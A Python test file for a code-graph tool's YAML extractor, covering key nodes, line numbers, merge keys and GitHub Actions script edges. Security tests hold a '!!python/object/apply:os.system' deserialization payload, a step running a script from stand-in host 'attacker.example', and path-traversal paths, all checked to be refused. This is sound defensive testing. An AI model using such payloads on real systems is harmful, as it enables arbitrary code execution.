"""Structural YAML extraction (#2214).

YAML was previously classified as a document, so AST-only / code-only runs
(``graphify update``) produced zero nodes from config-heavy repositories
(Helm charts, Kubernetes manifests, CI pipelines). These tests pin the new
structural path: ``.yaml``/``.yml`` classify as code and ``extract_yaml``
emits deterministic file/key nodes.
"""

from __future__ import annotations

from pathlib import Path

from graphify.detect import FileType, classify_file
from graphify.extractors.yaml_config import extract_yaml


def _write(path: Path, text: str) -> Path:
    path.write_text(text, encoding="utf-8")
    return path


def test_yaml_and_yml_classify_as_code(tmp_path):
    assert classify_file(_write(tmp_path / "values.yaml", "a: 1\n")) is FileType.CODE
    assert classify_file(_write(tmp_path / "deploy.yml", "a: 1\n")) is FileType.CODE


def test_extract_yaml_top_level_keys(tmp_path):
    path = _write(
        tmp_path / "values.yaml",
        "replicaCount: 2\nimage:\n  tag: latest\nservice:\n  port: 80\n",
    )
    result = extract_yaml(path)

    assert "error" not in result
    labels = {n["label"] for n in result["nodes"]}
    assert {"values.yaml", "replicaCount", "image", "service"} <= labels


def test_extract_yaml_nested_keys_are_contains_edges(tmp_path):
    path = _write(tmp_path / "values.yaml", "image:\n  tag: latest\n  pullPolicy: Always\n")
    result = extract_yaml(path)

    contains = [(e["source"], e["target"]) for e in result["edges"] if e["relation"] == "contains"]
    assert any("image" in source and "tag" in target for source, target in contains)
    assert any("image" in source and "pullpolicy" in target for source, target in contains)


def test_extract_yaml_ids_are_stable_across_runs(tmp_path):
    path = _write(tmp_path / "values.yaml", "a: 1\nb:\n  c: 2\n")
    first = extract_yaml(path)
    second = extract_yaml(path)
    assert [n["id"] for n in first["nodes"]] == [n["id"] for n in second["nodes"]]


def test_extract_yaml_scalar_document_is_skipped(tmp_path):
    result = extract_yaml(_write(tmp_path / "scalar.yaml", "just-a-string\n"))
    assert result.get("skipped") == "scalar yaml"


def test_extract_yaml_empty_document(tmp_path):
    result = extract_yaml(_write(tmp_path / "empty.yaml", ""))
    assert result.get("skipped") == "scalar yaml"


def test_multi_document_yaml_extracts_each_document(tmp_path):
    """A k8s-style multi-document stream (`---` separators) is the headline use
    case; each document must contribute distinct nodes rather than returning
    zero (safe_load_all, not safe_load)."""
    path = _write(
        tmp_path / "manifests.yaml",
        "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\n"
        "---\n"
        "apiVersion: v1\nkind: Service\nmetadata:\n  name: web-svc\n",
    )
    result = extract_yaml(path)
    assert "error" not in result and "skipped" not in result, result
    labels = {n["label"] for n in result["nodes"]}
    # both documents are present and kept distinct, labelled by kind + name
    assert "Deployment web" in labels
    assert "Service web-svc" in labels


def test_data_yaml_is_skipped(tmp_path):
    """A flat all-scalar data bundle with no config key (an i18n-style file) is
    skipped rather than minting orphan nodes, mirroring extract_json's gate."""
    result = extract_yaml(_write(
        tmp_path / "strings.yaml", "greeting: hello\nfarewell: goodbye\nthanks: cheers\n"))
    assert result.get("skipped") == "data yaml (not a config/manifest)"


def test_openapi_spec_yaml_is_skipped(tmp_path):
    """An OpenAPI/Swagger spec is data-heavy API description, not a config to walk."""
    result = extract_yaml(_write(
        tmp_path / "api.yaml",
        "openapi: 3.0.0\npaths:\n  /x:\n    get:\n      responses:\n        '200':\n          description: ok\n"))
    assert result.get("skipped") == "data yaml (not a config/manifest)"


def test_top_level_data_array_is_skipped(tmp_path):
    result = extract_yaml(_write(tmp_path / "list.yaml", "- one\n- two\n- three\n"))
    assert result.get("skipped") == "data yaml (not a config/manifest)"


def test_unsafe_yaml_tag_does_not_execute(tmp_path):
    """extract_yaml must use safe_load (never load): a `!!python/...` tag raises
    instead of executing arbitrary code on an untrusted repo."""
    marker = tmp_path / "pwned"
    path = _write(
        tmp_path / "evil.yaml",
        f"danger: !!python/object/apply:os.system ['touch {marker}']\n",
    )
    result = extract_yaml(path)
    assert "error" in result
    assert not marker.exists(), "safe_load must not execute the python tag"


def test_cloudformation_intrinsic_tags_do_not_fail_the_whole_file(tmp_path):
    """#5071: SafeLoader has no constructor for CloudFormation/SAM's short-form
    intrinsic tags (!Ref, !Equals, ...), so a template using any of them used to
    raise ConstructorError and produce zero nodes for the whole file, even
    though nothing about the tag itself is unsafe. The tagged value's own
    shape (scalar/sequence/mapping) is still read; the intrinsic is not
    evaluated."""
    path = _write(
        tmp_path / "template.yaml",
        "Conditions:\n"
        "  IsProd: !Equals [ !Ref Environment, prod ]\n"
        "Resources:\n"
        "  ExampleFunction:\n"
        "    Type: AWS::Serverless::Function\n"
        "    Properties:\n"
        "      Events:\n"
        "        ApiEvent:\n"
        "          Properties:\n"
        "            Path: /api/example\n",
    )
    result = extract_yaml(path)
    assert "error" not in result
    labels = {n["label"] for n in result["nodes"]}
    assert {"Conditions", "IsProd", "Resources", "ExampleFunction", "Events",
            "ApiEvent", "Path"} <= labels


def test_cloudformation_intrinsic_tag_still_does_not_execute_python_tag(tmp_path):
    """Control: tolerating an unrecognized !tag must not widen what a
    !!python/... tag can do — that one still raises, same as the plain-YAML
    case above."""
    marker = tmp_path / "pwned"
    path = _write(
        tmp_path / "template.yaml",
        "IsProd: !Equals [ !Ref Environment, prod ]\n"
        f"danger: !!python/object/apply:os.system ['touch {marker}']\n",
    )
    result = extract_yaml(path)
    assert "error" in result
    assert not marker.exists(), "safe_load must not execute the python tag"


def test_extract_yaml_caps_bound_output(tmp_path):
    """A config-named YAML with thousands of keys is bounded by the 500-pair cap."""
    body = "root:\n" + "".join(f"  k{i}: {i}\n" for i in range(2000))
    result = extract_yaml(_write(tmp_path / "values.yaml", body))
    assert len(result["nodes"]) <= 502  # file node + root key + at most 500 pairs


def _by_label(result):
    return {n["label"]: n for n in result["nodes"]}


def test_extract_yaml_keys_carry_their_own_line(tmp_path):
    """Every key node and its contains edge point at the line the key is on,
    not L1: the walk reads the composed node tree, which keeps marks."""
    result = extract_yaml(_write(
        tmp_path / "values.yaml",
        "name: x\nimage:\n  repository: nginx\n\n  tag: '1.25'\nservice:\n  port: 80\n",
    ))
    lines = {label: n["source_location"] for label, n in _by_label(result).items()}
    assert lines == {"values.yaml": "L1", "name": "L1", "image": "L2", "repository": "L3",
                     "tag": "L5", "service": "L6", "port": "L7"}
    edge_lines = {e["target"].rsplit("_", 1)[-1]: e["source_location"] for e in result["edges"]}
    assert edge_lines["tag"] == "L5" and edge_lines["port"] == "L7"


def test_multi_document_yaml_document_nodes_carry_their_line(tmp_path):
    result = extract_yaml(_write(
        tmp_path / "deploy.yaml",
        "kind: Deployment\nmetadata:\n  name: web\n---\nkind: Service\nmetadata:\n  name: web\n",
    ))
    nodes = _by_label(result)
    assert nodes["Deployment web"]["source_location"] == "L1"
    assert nodes["Service web"]["source_location"] == "L5"


def test_github_workflow_on_key_keeps_its_spelling(tmp_path):
    """YAML 1.1 resolves a bare `on` to the boolean True, so the constructed key
    of every GitHub Actions trigger block used to become a `True` node (id
    `<stem>_true`) and its children `<stem>_true_push`. Keys keep the text as
    written."""
    wf = tmp_path / ".github" / "workflows"
    wf.mkdir(parents=True)
    result = extract_yaml(_write(
        wf / "ci.yml",
        "name: CI\non:\n  push:\n    branches: [main]\njobs:\n  build:\n    runs-on: ubuntu-latest\n",
    ))
    nodes = _by_label(result)
    assert "True" not in nodes
    assert nodes["on"]["id"].endswith("_ci_on") and nodes["on"]["source_location"] == "L2"
    assert nodes["push"]["id"].endswith("_ci_on_push")
    assert not any(n["id"].endswith("_ci_true") for n in result["nodes"])


def test_on_key_counts_as_a_config_key_outside_github_workflows(tmp_path):
    """`on` is in the config-key probe, but its constructed key is True; a flat
    trigger file outside .github/workflows was skipped as a data bundle."""
    result = extract_yaml(_write(tmp_path / "pipeline-trigger.yml", "on: push\nretries: 3\n"))
    assert "skipped" not in result
    assert {"on", "retries"} <= set(_by_label(result))


def test_merge_keys_are_expanded_like_the_constructed_mapping(tmp_path):
    """`<<: *anchor` contributes the anchored keys (as safe_load does), an
    explicit key overrides a merged one at the explicit line, and the `<<`
    itself mints no node."""
    result = extract_yaml(_write(
        tmp_path / "docker-compose.yml",
        "x-base: &base\n  image: app\n  restart: always\nservices:\n  web:\n"
        "    <<: *base\n    restart: 'no'\n    ports: ['80:80']\n",
    ))
    web = {n["id"].rsplit("_web_", 1)[1]: n for n in result["nodes"] if "_web_" in n["id"]}
    assert set(web) == {"image", "restart", "ports"}
    assert web["restart"]["source_location"] == "L7"
    assert web["image"]["source_location"] == "L2"  # merged from the anchor
    assert not any("<<" in n["label"] for n in result["nodes"])


def test_merge_key_sequence_earlier_map_wins(tmp_path):
    """A ``<<: [*a, *b]`` sequence merge must give an EARLIER map precedence over a
    later one, matching the YAML merge spec and PyYAML's ``safe_load``/``flatten_mapping``
    (which reverses the sequence so the first map's keys override). Here both anchors
    define ``common``; ``*a`` is first, so ``services.web.common`` must resolve to
    ``*a``'s mapping (key node at L2), not ``*b``'s (L5)."""
    from graphify.extractors.yaml_config import _make_id, _file_stem

    text = (
        "x-a: &a\n  common:\n    from_a: 1\n"   # L1-L3
        "x-b: &b\n  common:\n    from_b: 2\n"   # L4-L6
        "services:\n  web:\n    <<: [*a, *b]\n"  # L7-L9
    )
    path = _write(tmp_path / "docker-compose.yml", text)

    # Ground truth: safe_load lets the earlier map in the sequence win.
    import yaml
    assert list(yaml.safe_load(text)["services"]["web"]["common"]) == ["from_a"]

    result = extract_yaml(path)
    stem = _file_stem(path)
    web_common = next(
        n for n in result["nodes"] if n["id"] == _make_id(stem, "web", "common")
    )
    # The earlier map (*a) wins, so the key node is *a*'s ``common`` at L2, not *b*'s L5.
    assert web_common["source_location"] == "L2"


def test_github_workflow_run_steps_emit_script_edges(tmp_path):
    """#5565: GitHub Actions workflow bash `run:` steps emit edges to scripts they execute."""
    from graphify.affected import affected_nodes
    from graphify.build import build_from_json
    from graphify.detect import detect
    from graphify.extract import extract

    wf = tmp_path / ".github" / "workflows"
    scripts = tmp_path / "scripts"
    wf.mkdir(parents=True)
    scripts.mkdir()

    _write(
        wf / "ci.yml",
        "name: ci\n"
        "on: push\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: bash scripts/check.sh\n"
        "      - run: ./scripts/lint\n",
    )
    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho checked\n")
    _write(scripts / "lint", "#!/usr/bin/env bash\necho linted\n")

    det = detect(tmp_path)
    result = extract([Path(p) for p in det["files"]["code"]], cache_root=tmp_path, root=tmp_path, parallel=False)
    calls = [
        (e["source"], e["target"], e["source_location"])
        for e in result["edges"]
        if e.get("relation") == "calls"
    ]
    assert ("github_workflows_ci", "scripts_check_sh__entry", "L7") in calls, result["edges"]
    assert ("github_workflows_ci", "scripts_lint__entry", "L8") in calls, result["edges"]

    graph = build_from_json(result, directed=True)
    for seed_id in ("scripts_check", "scripts_lint"):
        hit_ids = {h.node_id for h in affected_nodes(graph, seed_id)}
        assert "github_workflows_ci" in hit_ids, (seed_id, hit_ids)


def test_github_workflow_multiline_flags_working_dir_and_source(tmp_path):
    """#5565: Multiline `run: |`, flags (`-euo pipefail`), `working-directory`,
    `$GITHUB_WORKSPACE`, Python interpreter invocations, and `source` calls."""
    from graphify.extract import extract

    wf = tmp_path / ".github" / "workflows"
    scripts = tmp_path / "scripts"
    sub = tmp_path / "sub"
    wf.mkdir(parents=True)
    scripts.mkdir()
    sub.mkdir()

    ci = _write(
        wf / "ci.yml",
        "name: ci\n"
        "on: push\n"
        "defaults:\n"
        "  run:\n"
        "    working-directory: sub\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - working-directory: .\n"
        "        run: |\n"
        "          bash -euo pipefail scripts/check.sh\n"
        "          bash -c 'scripts/skip.sh'\n"
        "          \"$GITHUB_WORKSPACE/scripts/lint\"\n"
        "          python3 scripts/verify.py\n"
        "          source scripts/lib.sh\n"
        "          lib_helper\n"
        "      - run: ./inner.sh\n",
    )
    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
    skip_sh = _write(scripts / "skip.sh", "#!/usr/bin/env bash\necho skip\n")
    lint = _write(scripts / "lint", "#!/usr/bin/env bash\necho lint\n")
    verify_py = _write(scripts / "verify.py", "print('ok')\n")
    lib_sh = _write(scripts / "lib.sh", "lib_helper() { echo helper; }\n")
    inner_sh = _write(sub / "inner.sh", "#!/usr/bin/env bash\necho inner\n")

    result = extract(
        [ci, check_sh, skip_sh, lint, verify_py, lib_sh, inner_sh],
        cache_root=tmp_path,
        root=tmp_path,
        parallel=False,
    )
    edges = {
        (e["source"], e["relation"], e["target"], e.get("source_location"))
        for e in result["edges"]
    }
    assert ("github_workflows_ci", "calls", "scripts_check_sh__entry", "L12") in edges
    assert ("github_workflows_ci", "calls", "scripts_lint__entry", "L14") in edges
    assert ("github_workflows_ci", "invokes", "scripts_verify", "L15") in edges
    assert ("github_workflows_ci", "imports_from", "scripts_lib", "L16") in edges
    assert ("github_workflows_ci", "calls", "scripts_lib_lib_helper", "L17") in edges
    assert ("github_workflows_ci", "calls", "sub_inner_sh__entry", "L18") in edges
    assert not any(
        e["source"] == "github_workflows_ci" and e["target"] == "scripts_skip_sh__entry"
        for e in result["edges"]
    )


def test_github_workflow_shell_and_runner_gates(tmp_path):
    """#5565: Only bash/unset shells (on non-Windows runners) parse `run:` as bash."""
    from graphify.extract import extract

    wf = tmp_path / ".github" / "workflows"
    scripts = tmp_path / "scripts"
    wf.mkdir(parents=True)
    scripts.mkdir()
    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")

    ci = _write(
        wf / "ci.yml",
        "name: shells\n"
        "on: push\n"
        "jobs:\n"
        "  linux:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - shell: pwsh\n"
        "        run: bash scripts/check.sh\n"
        "      - shell: python\n"
        "        run: ./scripts/check.sh\n"
        "      - shell: bash -eo pipefail {0}\n"
        "        run: scripts/check.sh\n"
        "  win:\n"
        "    runs-on: windows-latest\n"
        "    steps:\n"
        "      - run: bash scripts/check.sh\n"
        "  win_explicit_bash:\n"
        "    runs-on: windows-latest\n"
        "    steps:\n"
        "      - shell: bash\n"
        "        run: ./scripts/check.sh\n"
        "  default_pwsh:\n"
        "    runs-on: ubuntu-latest\n"
        "    defaults:\n"
        "      run:\n"
        "        shell: pwsh\n"
        "    steps:\n"
        "      - run: bash scripts/check.sh\n",
    )

    result = extract([ci, check_sh], cache_root=tmp_path, root=tmp_path, parallel=False)
    script_calls = [
        e["source_location"]
        for e in result["edges"]
        if e.get("relation") == "calls" and e.get("target") == "scripts_check_sh__entry"
    ]
    assert sorted(script_calls) == ["L12", "L21"]


def test_github_workflow_fail_closed_and_security(tmp_path, monkeypatch):
    """#5565: Expressions, missing/non-script targets, traversal, UNC paths,
    and non-workflow YAMLs fail closed without probing outside the root."""
    import builtins
    import pathlib

    wf = tmp_path / ".github" / "workflows"
    scripts = tmp_path / "scripts"
    wf.mkdir(parents=True)
    scripts.mkdir()

    outside = _write(tmp_path.parent / f"outside_{tmp_path.name}.sh", "echo outside\n")
    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
    _write(scripts / "lint", "#!/usr/bin/env bash\necho lint\n")
    _write(scripts / "notes.txt", "not a script\n")
    _write(scripts / "plain", "no shebang here\n")

    unc_hits: list[str] = []
    for name in ("exists", "is_file", "is_dir"):
        orig = getattr(pathlib.Path, name)

        def make_probe(orig_fn):
            def wrapper(self, *args, **kwargs):
                if str(self)[:2] in ("//", "\\\\"):
                    unc_hits.append(str(self))
                return orig_fn(self, *args, **kwargs)
            return wrapper

        monkeypatch.setattr(pathlib.Path, name, make_probe(orig))

    ci = _write(
        wf / "sec.yml",
        "name: sec\n"
        "on: push\n"
        "jobs:\n"
        "  check:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: bash ${{ inputs.dir }}scripts/check.sh\n"
        "      - run: bash \"${{ github.workspace }}/scripts/check.sh\"\n"
        "      - run: |\n"
        "          echo \"${{\n"
        "            matrix.os\n"
        "          }}\"\n"
        "          ./scripts/lint\n"
        f"      - run: bash ../../{outside.name}\n"
        "      - run: bash //attacker.example/share/x.sh\n"
        "      - run: ./scripts/notes.txt\n"
        "      - run: ./scripts/plain\n"
        "      - run: bash scripts/missing.sh\n"
        "      - run: '# bash scripts/check.sh'\n"
        "      - working-directory: ..\n"
        f"        run: bash ./{outside.name}\n"
        "      - working-directory: ${{ matrix.dir }}\n"
        "        run: bash scripts/check.sh\n",
    )
    non_wf = _write(
        tmp_path / "deploy.yml",
        "jobs:\n  x:\n    steps:\n      - run: bash scripts/check.sh\n",
    )

    from graphify.extractors.base import set_active_scan_root

    prev = set_active_scan_root(tmp_path.resolve())
    try:
        wf_res = extract_yaml(ci)
        non_wf_res = extract_yaml(non_wf)
    finally:
        set_active_scan_root(prev)

    assert unc_hits == [], f"UNC path was stat-ed: {unc_hits}"
    script_edges = [e for e in wf_res["edges"] if e["relation"] != "contains"]
    assert len(script_edges) == 1, script_edges
    assert script_edges[0]["source_location"] == "L13"
    assert Path(script_edges[0]["target_file"]).resolve() == (scripts / "lint").resolve()
    assert not any(e["relation"] != "contains" for e in non_wf_res["edges"])

    # Missing tree_sitter_bash degrades cleanly without breaking YAML extraction.
    real_import = builtins.__import__

    def no_ts_bash(name, *args, **kwargs):
        if name == "tree_sitter_bash":
            raise ImportError("mocked")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", no_ts_bash)
    degraded = extract_yaml(ci)
    assert "error" not in degraded
    assert any(n["label"] == "ci" or n["label"] == "sec.yml" for n in degraded["nodes"])


def test_composite_action_run_steps_emit_script_edges(tmp_path):
    """#5565: Composite action `action.yml` bash steps emit script edges (explicit shell required)."""
    from graphify.extract import extract

    act_dir = tmp_path / ".github" / "actions" / "check"
    scripts = tmp_path / "scripts"
    act_dir.mkdir(parents=True)
    scripts.mkdir()

    action_yml = _write(
        act_dir / "action.yml",
        "name: Check\n"
        "runs:\n"
        "  using: composite\n"
        "  steps:\n"
        "    - shell: bash\n"
        "      run: bash scripts/check.sh\n"
        "    - shell: pwsh\n"
        "      run: bash scripts/skip.sh\n"
        "    - run: bash scripts/skip.sh\n",
    )
    check_sh = _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
    skip_sh = _write(scripts / "skip.sh", "#!/usr/bin/env bash\necho skip\n")

    result = extract([action_yml, check_sh, skip_sh], cache_root=tmp_path, root=tmp_path, parallel=False)
    calls = [e for e in result["edges"] if e.get("relation") == "calls"]
    assert len(calls) == 1
    assert calls[0]["target"] == "scripts_check_sh__entry"
    assert calls[0]["source_location"] == "L6"


def test_github_workflow_parses_in_memory_without_shell_or_tempfile(tmp_path, monkeypatch):
    """#5565: Workflow bash parsing never writes temp files or spawns subprocesses."""
    import os
    import subprocess
    import tempfile

    def boom(*args, **kwargs):
        raise AssertionError("forbidden execution or tempfile")

    monkeypatch.setattr(tempfile, "NamedTemporaryFile", boom)
    monkeypatch.setattr(tempfile, "mkstemp", boom)
    monkeypatch.setattr(subprocess, "run", boom)
    monkeypatch.setattr(subprocess, "Popen", boom)
    monkeypatch.setattr(os, "system", boom)

    wf = tmp_path / ".github" / "workflows"
    scripts = tmp_path / "scripts"
    wf.mkdir(parents=True)
    scripts.mkdir()
    _write(scripts / "check.sh", "#!/usr/bin/env bash\necho ok\n")
    ci = _write(
        wf / "ci.yml",
        "name: ci\non: push\njobs:\n  check:\n    runs-on: ubuntu-latest\n"
        "    steps:\n      - run: bash scripts/check.sh\n",
    )
    first = extract_yaml(ci)
    second = extract_yaml(ci)
    assert first == second
    assert any(e["relation"] == "calls" for e in first["edges"])
